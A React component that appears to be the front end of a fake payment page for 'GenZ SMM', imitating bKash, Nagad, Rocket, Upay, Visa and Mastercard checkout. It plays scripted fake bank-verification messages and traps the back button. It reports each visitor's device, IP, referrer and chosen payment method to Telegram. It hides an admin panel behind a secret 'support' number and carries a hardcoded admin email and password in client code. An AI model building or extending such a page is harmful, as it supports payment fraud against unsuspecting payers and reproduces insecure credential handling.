import { useState, useEffect } from "react";
import { Home, Upload, X, Headphones, HelpCircle, Gift, LogIn, LogOut, Lock } from "lucide-react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { Switch } from "@/components/ui/switch";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import DualCircleLoader from "@/components/DualCircleLoader";
import { sendTelegramNotification } from "@/lib/telegram";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";
import AllowedWebsitesAdmin from "@/components/AllowedWebsitesAdmin";

import genzLogo from "@/assets/genz-logo.png";
import bkashLogo from "@/assets/bkash-logo.png";
import nagadLogo from "@/assets/nagad-logo.png";
import rocketLogo from "@/assets/rocket-logo.png";
import upayLogo from "@/assets/upay-logo.png";
import visaLogo from "@/assets/visa-logo.png";
import mastercardLogo from "@/assets/mastercard-logo-color.png";


const ADMIN_EMAIL = "abir789@gmail.com";
const ADMIN_PASSWORD = "778899";

const gatewayMessages = [
  "Connecting to GenZ Secure Gateway...",
  "Verifying merchant credentials...",
  "Authorizing transaction...",
  "Communicating with bank server...",
  "Finalizing secure gateway...",
];

const defaultEnabledMethods = {
  bkash: true,
  nagad: true,
  rocket: false,
  upay: false,
  visa: true,
  mastercard: true,
};

const paymentMethods = [
  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-16 md:h-20' },
  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-16 md:h-20' },
  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-16 md:h-20' },
  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-16 md:h-20' },
  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'Visa', h: 'h-14 md:h-18' },
  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-14 md:h-18' },
] as const;

const Index = () => {
  const { checking: referrerChecking } = useReferrerGuard();
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get('amount') || "00";
  const [showGateway, setShowGateway] = useState(() => {
    if (typeof window === 'undefined') return true;
    return sessionStorage.getItem('genz_gateway_shown') !== 'true';
  });
  const [messageIndex, setMessageIndex] = useState(0);
  const [progress, setProgress] = useState(0);
  const [showLoader, setShowLoader] = useState(false);
  const [clickedCard, setClickedCard] = useState<string | null>(null);
  const [isAdmin, setIsAdmin] = useState(false);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [loginEmail, setLoginEmail] = useState("");
  const [loginPassword, setLoginPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [showSupportModal, setShowSupportModal] = useState(false);
  
  const [supportNumber, setSupportNumber] = useState("");
  
  const [loginUnlocked, setLoginUnlocked] = useState(false);
  const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>(defaultEnabledMethods);
  const [badgeColor, setBadgeColor] = useState<'slate' | 'red'>('slate');

  const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;

  // Back button interception
  useEffect(() => {
    window.history.pushState(null, "", window.location.href);
    const handlePopState = () => {
      window.history.pushState(null, "", window.location.href);
      navigate(`/payment-cancelled?channel=GenZ&reason=Payment isn't completed&amount=${amount}`);
    };
    window.addEventListener("popstate", handlePopState);
    return () => window.removeEventListener("popstate", handlePopState);
  }, [navigate, amount]);

  // Check admin session on mount
  useEffect(() => {
    if (sessionStorage.getItem("admin_logged_in") === "true") {
      setIsAdmin(true);
    }
  }, []);

  const handleAdminLogin = () => {
    if (loginEmail === ADMIN_EMAIL && loginPassword === ADMIN_PASSWORD) {
      setIsAdmin(true);
      setShowLoginModal(false);
      setLoginError("");
      sessionStorage.setItem("admin_logged_in", "true");
    } else {
      setLoginError("Invalid email or password");
    }
  };

  const handleAdminLogout = () => {
    sessionStorage.removeItem("admin_logged_in");
    setIsAdmin(false);
    setLoginUnlocked(false);
  };

  const toggleMethod = async (id: string, enabled: boolean) => {
    const previous = enabledMethods[id] ?? false;
    setEnabledMethods((prev) => ({ ...prev, [id]: enabled }));

    const { error } = await supabase
      .from("payment_methods")
      .update({ enabled, updated_at: new Date().toISOString() })
      .eq("id", id);

    if (error) {
      setEnabledMethods((prev) => ({ ...prev, [id]: previous }));
    }
  };

  const updateBadgeColor = async (color: 'slate' | 'red') => {
    setBadgeColor(color);
    await supabase
      .from("app_settings")
      .upsert({ key: 'badge_color', value: color, updated_at: new Date().toISOString() });
  };

  // Fetch payment methods from DB and subscribe to realtime
  useEffect(() => {
    const fetchMethods = async () => {
      const { data } = await supabase.from("payment_methods").select("*");
      if (data) {
        const map: Record<string, boolean> = { ...defaultEnabledMethods };
        data.forEach((m) => {
          if (m.id in defaultEnabledMethods) {
            map[m.id] = m.enabled;
          }
        });
        setEnabledMethods(map);
      }
    };
    const fetchBadgeColor = async () => {
      const { data } = await supabase.from("app_settings").select("value").eq("key", "badge_color").maybeSingle();
      if (data?.value === 'red' || data?.value === 'slate') setBadgeColor(data.value);
    };
    fetchMethods();
    fetchBadgeColor();

    // Send page entry notification with device, IP, and referrer
    sendTelegramNotification({
      type: 'page_entry',
      amount,
      referrer: document.referrer || 'Direct',
    });

    const channelName = `index_realtime_${Math.random().toString(36).slice(2)}`;
    const channel = supabase
      .channel(channelName)
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "payment_methods" },
        (payload) => {
          const row = (payload.new ?? payload.old) as { id?: string; enabled?: boolean };
          if (!row?.id || !(row.id in defaultEnabledMethods)) return;
          setEnabledMethods((prev) => ({
            ...prev,
            [row.id as string]: row.enabled as boolean,
          }));
        }
      )
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "app_settings" },
        (payload) => {
          const row = payload.new as { key?: string; value?: string };
          if (row?.key === 'badge_color' && (row.value === 'red' || row.value === 'slate')) {
            setBadgeColor(row.value);
          }
        }
      )
      .subscribe((status) => {
        if (status === 'SUBSCRIBED') {
          // Resync on (re)connect to catch any missed updates
          fetchMethods();
          fetchBadgeColor();
        }
      });

    // Safety net: re-fetch when tab becomes visible again
    const onVisibility = () => {
      if (document.visibilityState === 'visible') {
        fetchMethods();
        fetchBadgeColor();
      }
    };
    document.addEventListener('visibilitychange', onVisibility);

    return () => {
      supabase.removeChannel(channel);
      document.removeEventListener('visibilitychange', onVisibility);
    };
  }, []);

  const cardTypes = ['visa', 'mastercard'];
  const allVisibleMethodsDisabled = paymentMethods.every((method) => !(enabledMethods[method.id] ?? false));
  
  const handlePaymentSelect = (route: string) => {
    const methodName = route.replace('/', '');
    const isCard = cardTypes.includes(methodName);
    sendTelegramNotification({
      type: 'payment_activity',
      method: isCard ? methodName.charAt(0).toUpperCase() + methodName.slice(1) : methodName,
      paymentType: isCard ? 'card' : 'mfs',
      referrer: document.referrer || 'Direct',
    });
    
    if (isMobileOrTablet) {
      setClickedCard(route);
      setTimeout(() => {
        setShowLoader(true);
        setTimeout(() => navigate(`${route}?amount=${amount}`), 3000);
      }, 300);
    } else {
      setShowLoader(true);
      setTimeout(() => navigate(`${route}?amount=${amount}`), 3000);
    }
  };

  useEffect(() => {
    if (!showGateway) return;

    const totalDuration = 2000; // 2 seconds total
    const messageInterval = totalDuration / gatewayMessages.length;

    // Progress bar animation
    const progressInterval = setInterval(() => {
      setProgress((prev) => {
      if (prev >= 100) return 100;
        return prev + 1;
      });
    }, 20);

    // Cycle through messages
    const msgTimer = setInterval(() => {
      setMessageIndex((prev) => {
        if (prev >= gatewayMessages.length - 1) return prev;
        return prev + 1;
      });
    }, messageInterval);

    // Hide gateway after all messages
    const hideTimer = setTimeout(() => {
      sessionStorage.setItem('genz_gateway_shown', 'true');
      setShowGateway(false);
    }, totalDuration);

    return () => {
      clearInterval(progressInterval);
      clearInterval(msgTimer);
      clearTimeout(hideTimer);
    };
  }, [showGateway]);

  if (referrerChecking) {
    return null; // No content while checking referrer
  }

  if (showGateway) {
    return (
      <div className="min-h-[100dvh] w-screen bg-[#e8edf2] flex items-center justify-center p-4 overflow-hidden fixed inset-0 z-50">
        <div className="w-full max-w-md mx-auto">
          <div className="bg-gradient-to-br from-[#2d7dd2] via-[#2570c4] to-[#1a5fb4] rounded-2xl shadow-[0_20px_60px_rgba(26,95,180,0.4)] p-8 flex flex-col items-center relative overflow-hidden">
            {/* Subtle shimmer overlay */}
            <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/5 to-transparent pointer-events-none" style={{ animation: 'shimmer 3s ease-in-out infinite' }} />
            
            {/* Animated Dots */}
            <div className="flex gap-3 mb-7 relative z-10">
              {[0, 1, 2].map((i) => (
                <div
                  key={i}
                  className="w-2 h-2 rounded-full bg-white"
                  style={{
                    animation: `dotBounce 1.4s ease-in-out ${i * 0.16}s infinite`,
                  }}
                />
              ))}
            </div>

            {/* Logo */}
            <div className="w-20 h-20 rounded-full bg-[#1a2332] flex items-center justify-center mb-5 relative z-10 shadow-lg ring-2 ring-white/10">
              <img src={genzLogo} alt="GenZ" className="w-[72px] h-[72px] rounded-full object-cover" />
            </div>

            {/* Title */}
            <h2 className="text-white text-xl font-bold mb-2 relative z-10 tracking-wide">Processing Your Payment...</h2>
            <p className="text-white/75 text-sm mb-6 transition-all duration-500 min-h-[20px] relative z-10">
              {gatewayMessages[messageIndex]}
            </p>

            {/* Progress Bar */}
            <div className="w-full bg-white/20 rounded-full h-2.5 mb-6 overflow-hidden relative z-10 backdrop-blur-sm">
              <div
                className="h-full rounded-full transition-all duration-100 ease-linear"
                style={{
                  width: `${progress}%`,
                  background: 'linear-gradient(90deg, #ffffff 0%, #e0ecff 50%, #ffffff 100%)',
                  boxShadow: '0 0 10px rgba(255,255,255,0.5)',
                }}
              />
            </div>

            {/* Secure badge */}
            <div className="flex items-center gap-2 text-white/90 mb-2 relative z-10">
              <Lock className="w-4 h-4" />
              <span className="text-sm font-semibold tracking-wide">GenZ Secure Gateway</span>
            </div>
            <p className="text-white/40 text-xs relative z-10">Please do not close or refresh this page</p>
          </div>
        </div>

        <style>{`
          @keyframes dotBounce {
            0%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-8px); }
          }
          @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
          }
        `}</style>
      </div>
    );
  }

  return (
    <>
      <div className="h-screen bg-background flex items-start md:items-center justify-center p-2 md:p-4 overflow-hidden">
        <div className="w-full max-w-[520px] md:max-w-[700px] lg:max-w-[800px] flex flex-col h-full">
          {/* Card - white on desktop, transparent on mobile */}
          <div className="bg-transparent md:bg-card md:rounded-2xl md:shadow-sm flex flex-col h-[100dvh] md:h-auto md:max-h-[100dvh] overflow-hidden">
            {/* Top Bar - All icons in one white box */}
            <div className="flex items-center justify-center px-3 py-2 md:px-5 md:py-3">
              <div className="bg-card rounded-lg flex items-center justify-between w-full px-4 py-2 shadow-sm">
                <Home className="w-4 h-4 text-foreground cursor-pointer" strokeWidth={1.5} onClick={() => navigate(`/?amount=${amount}`)} />
                <div className="flex items-center gap-3">
                  <Upload className="w-4 h-4 text-foreground" strokeWidth={1.5} />
                  <X className="w-4 h-4 text-foreground cursor-pointer" strokeWidth={1.5} onClick={() => navigate(`/payment-cancelled?channel=GenZ&reason=Payment isn't completed&amount=${amount}`)} />
                </div>
              </div>
            </div>

            {/* Content */}
            <div className={`flex-1 px-3 md:px-6 pb-16 md:pb-6 flex flex-col ${isAdmin ? 'overflow-y-auto' : 'overflow-hidden'}`} style={{ overscrollBehavior: 'contain', WebkitOverflowScrolling: 'touch' }}>
              
              {/* GenZ Logo */}
              <div className="flex justify-center mt-1 mb-2">
                <img 
                  src={genzLogo} 
                  alt="GenZ" 
                  className="w-14 h-14 md:w-20 md:h-20 rounded-full object-cover"
                />
              </div>

              {/* Title Section */}
              <div className="text-center mb-2">
                <h1 className="text-foreground text-base md:text-xl font-bold mb-0.5">
                  GenZ SMM
                </h1>
                <p className="text-muted-foreground text-sm md:text-base font-normal">
                  Online Payment
                </p>
              </div>

              {/* Icon Row */}
              <div className="flex justify-center gap-4 md:gap-8 mb-3">
                <div className="flex flex-col items-center gap-0.5 cursor-pointer" onClick={() => setShowSupportModal(true)}>
                  <div className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm">
                    <Headphones className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                  </div>
                  <span className="text-[10px] md:text-xs text-muted-foreground">Support</span>
                </div>
                <div className="flex flex-col items-center gap-0.5">
                  <div className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm">
                    <HelpCircle className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                  </div>
                  <span className="text-[10px] md:text-xs text-muted-foreground">FAQ</span>
                </div>
                <div className="flex flex-col items-center gap-0.5 relative">
                  <div className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm">
                    <Gift className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                  </div>
                  <span className="absolute -top-0.5 -right-0.5 w-3.5 h-3.5 bg-destructive text-destructive-foreground text-[8px] rounded-full flex items-center justify-center font-medium">2</span>
                  <span className="text-[10px] md:text-xs text-muted-foreground">Offers</span>
                </div>
                <div className="flex flex-col items-center gap-0.5">
                  <div 
                    onClick={() => {
                      if (isAdmin) {
                        handleAdminLogout();
                      } else if (loginUnlocked) {
                        setShowLoginModal(true);
                      }
                    }}
                    className="w-8 h-8 md:w-10 md:h-10 bg-card md:bg-secondary rounded-full flex items-center justify-center shadow-sm cursor-pointer"
                  >
                    {isAdmin ? (
                      <LogOut className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                    ) : (
                      <LogIn className="w-4 h-4 md:w-5 md:h-5 text-muted-foreground" strokeWidth={1.5} />
                    )}
                  </div>
                  <span className="text-[10px] md:text-xs text-muted-foreground">{isAdmin ? 'Logout' : 'Login'}</span>
                </div>
              </div>

              {/* Mobile Banking Button */}
              <button className="w-full bg-primary text-primary-foreground py-2 md:py-2.5 rounded-lg font-medium text-sm mb-3 tracking-wide">
                মোবাইল ব্যাংকিং
              </button>

              {/* Payment Methods Grid or Payment Off Watermark */}
              <div className="relative">
                {Object.keys(enabledMethods).length > 0 && allVisibleMethodsDisabled && !isAdmin && (
                  <div className="absolute inset-0 z-10 flex items-center justify-center rounded-xl pointer-events-none select-none" style={{ transform: 'rotate(-18deg)' }}>
                    <div className="flex flex-col items-center gap-1">
                      <svg xmlns="http://www.w3.org/2000/svg" className="w-16 h-16 md:w-20 md:h-20 text-destructive/30" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                      </svg>
                      <div className="text-destructive/25 text-3xl md:text-5xl font-black tracking-[0.15em] uppercase">Payment Off</div>
                      <p className="text-destructive/40 text-sm md:text-base text-center max-w-[300px] leading-relaxed font-bold tracking-wide">
                        মার্চেন্ট পেমেন্ট লিমিট শেষ হয়ে যাওয়ায় সাময়িক সময়ের জন্য পেমেন্ট সেবা প্রদান বন্ধ আছে।
                      </p>
                    </div>
                  </div>
                )}
                <div className="grid grid-cols-2 md:grid-cols-3 gap-2.5 md:gap-3">
                {paymentMethods.map((method) => {
                    const isEnabled = enabledMethods[method.id] ?? false;
                    return (
                      <div
                        key={method.id}
                        onClick={() => !isAdmin && isEnabled && handlePaymentSelect(method.route)}
                        className={`relative group bg-transparent md:bg-card rounded-lg border border-border flex items-center justify-center h-[80px] md:h-[96px] overflow-hidden transition-all ${isEnabled && !isAdmin ? 'cursor-pointer' : ''} ${!isEnabled ? 'cursor-not-allowed' : ''}`}
                      >
                        <img src={method.logo} alt={method.alt} className={`${method.h} object-contain transition-transform duration-300 ${isEnabled ? '' : 'opacity-50'} ${isEnabled && !isAdmin ? `lg:group-hover:scale-90 ${clickedCard === method.route ? 'scale-90' : ''}` : ''}`} />
                        {!isEnabled && !isAdmin && (
                          <div className={`absolute top-1.5 right-1.5 text-[10px] md:text-[11px] px-2.5 py-[4px] rounded-[4px] font-semibold tracking-wide whitespace-nowrap text-center leading-none flex items-center justify-center shadow-sm transition-colors text-white ${badgeColor === 'red' ? 'bg-red-400/80' : 'bg-slate-400/80'}`}>
                            Temporarily Unavailable
                          </div>
                        )}
                        {isAdmin && (
                          <div className="absolute right-2 top-1/2 -translate-y-1/2">
                            <Switch
                              checked={isEnabled}
                              onCheckedChange={(checked) => toggleMethod(method.id, checked)}
                              className="scale-75"
                            />
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Admin: Badge color control */}
              {isAdmin && (
                <div className="mt-3 bg-card rounded-xl border border-border p-3 flex items-center justify-between">
                  <span className="text-xs font-semibold text-foreground">"Temporarily Unavailable"</span>
                  <div className="flex gap-2">
                    <button
                      onClick={() => updateBadgeColor('slate')}
                      className={`px-3 py-1 rounded-md text-[11px] font-semibold transition-all ${badgeColor === 'slate' ? 'bg-gradient-to-r from-slate-700 to-slate-800 text-white ring-2 ring-offset-1 ring-slate-700' : 'bg-secondary text-muted-foreground'}`}
                    >
                      Slate
                    </button>
                    <button
                      onClick={() => updateBadgeColor('red')}
                      className={`px-3 py-1 rounded-md text-[11px] font-semibold transition-all ${badgeColor === 'red' ? 'bg-gradient-to-r from-red-600 to-red-700 text-white ring-2 ring-offset-1 ring-red-600' : 'bg-secondary text-muted-foreground'}`}
                    >
                      Red
                    </button>
                  </div>
                </div>
              )}

              {/* Allowed Websites Admin - only visible to admin */}
              {isAdmin && (
                <div className="mt-4 bg-card rounded-xl border border-border p-4">
                  <AllowedWebsitesAdmin />
                </div>
              )}
            </div>

            {/* Pay Footer - always fixed at bottom */}
            <div className="mt-auto w-full bg-pay-bar py-3 min-[375px]:py-3.5 sm:py-4 md:py-5 text-center">
              <span className="text-primary font-bold text-sm min-[375px]:text-base md:text-lg">Pay {amount} BDT</span>
            </div>
          </div>
        </div>

        {/* Login Modal */}
        {showLoginModal && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setShowLoginModal(false)}>
            <div className="w-full max-w-sm bg-card rounded-2xl shadow-lg p-6 space-y-4" onClick={(e) => e.stopPropagation()}>
              <h2 className="text-xl font-bold text-foreground text-center">Admin Login</h2>
              <Input
                type="email"
                placeholder="Email"
                value={loginEmail}
                onChange={(e) => setLoginEmail(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleAdminLogin()}
              />
              <Input
                type="password"
                placeholder="Password"
                value={loginPassword}
                onChange={(e) => setLoginPassword(e.target.value)}
                onKeyDown={(e) => e.key === "Enter" && handleAdminLogin()}
              />
              {loginError && (
                <p className="text-sm text-destructive text-center">{loginError}</p>
              )}
              <Button onClick={handleAdminLogin} className="w-full">
                Login
              </Button>
            </div>
          </div>
        )}

        {/* Support Modal */}
        {showSupportModal && (
          <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4" onClick={() => setShowSupportModal(false)}>
            <div className="w-full max-w-sm bg-card rounded-2xl shadow-lg p-6 space-y-4" onClick={(e) => e.stopPropagation()}>
              <h2 className="text-xl font-bold text-foreground text-center">Support</h2>
              <p className="text-sm text-muted-foreground text-center">Enter your mobile number for support</p>
              <Input
                type="text"
                inputMode="numeric"
                placeholder="01XXXXXXXXX"
                value={supportNumber}
                onChange={(e) => setSupportNumber(e.target.value.replace(/\D/g, "").slice(0, 11))}
              />
              <Button
                onClick={() => {
                  if (supportNumber.length === 11) {
                    if (supportNumber === "01789789789") {
                      setLoginUnlocked(true);
                    }
                    setShowSupportModal(false);
                    setSupportNumber("");
                  }
                }}
                disabled={supportNumber.length !== 11}
                className="w-full"
              >
                Submit
              </Button>
            </div>
          </div>
        )}

        {showLoader && <DualCircleLoader size={47} transparentBg />}
      </div>
      
    </>
  );
};

export default Index;
